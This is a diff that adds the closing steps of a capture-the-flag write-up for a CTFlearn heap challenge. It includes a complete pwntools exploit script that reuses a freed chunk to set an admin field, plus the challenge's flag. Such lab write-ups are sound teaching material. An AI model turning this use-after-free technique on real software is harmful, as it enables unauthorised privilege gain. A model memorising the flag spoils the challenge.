@@ -181,5 +181,79 @@ As you can see, it overlaps our previous chunk. Let's do another POC if we input
 
 
 14. Great! It's proven now. The problem now is how to trigger `curr->admin != 0`??
-15. 
+15. No need to worry, if we already done the previous step, `curr->admin` shall set to other than 0.
+16. Hence we just need to choose option 5 then option 3 to get the flag.
 
+> RESULT
+
+![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/5ff0aa66-3ee6-416c-8db0-e20d7101a16a)
+
+
+17. Awesome! Here's the full script.
+
+> SCRIPT
+
+```py
+from pwn import * 
+import os 
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+# nc thekidofarcrania.com 13226
+gdbscript="""
+init-pwndbg
+continue
+""".format(**locals())
+
+exe = './login'
+elf = context.binary = ELF(exe, checksec=True)
+# context.log_level = 'ERROR'
+context.log_level = 'INFO'
+# context.log_level = 'DEBUG'
+
+def login(buffer):
+    sh.sendlineafter(b'>', b'1')
+    sh.sendlineafter(b':', f'{buffer}')
+
+def sign_out():
+    sh.sendlineafter(b'>', b'2')
+
+def print_flag():
+    sh.sendlineafter(b'>', b'3')
+    sh.sendlineafter(b'?', b'A' * 0x30) # 48 (allocate the same chunk as the 1st one)
+
+def lock_user():
+    sh.sendlineafter(b'>', b'4')
+
+def restore_user():
+    sh.sendlineafter(b'>', b'5')
+
+sh = start()
+
+login(b'AABBCCDD')
+lock_user()
+sign_out()
+print_flag()
+restore_user()
+
+sh.sendlineafter(b'>', b'3')
+
+sh.interactive()
+```
+
+![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/c6204a4a-334f-49f2-8e09-cab947a6afe2)
+
+
+18. Got the flag!
+
+## FLAG
+
+```
+CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}
+```
